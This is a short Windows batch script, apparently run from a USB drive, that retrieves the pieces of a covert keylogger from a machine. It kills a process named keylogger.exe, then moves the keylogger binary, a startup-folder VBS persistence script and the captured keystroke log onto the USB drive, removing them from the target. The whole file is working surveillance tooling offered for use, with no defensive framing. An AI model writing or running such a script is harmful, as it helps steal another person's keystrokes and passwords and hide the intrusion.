@echo off

set USB=%~d0
set STARTUP=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

echo Retrieving files...

taskkill /im keylogger.exe /f 2>nul

move "C:\Users\Public\keylogger.exe" "%USB%"
move "%STARTUP%\script.vbs" "%USB%"
move "C:\Users\Public\keylogs.txt" "%USB%"

echo Done.
pause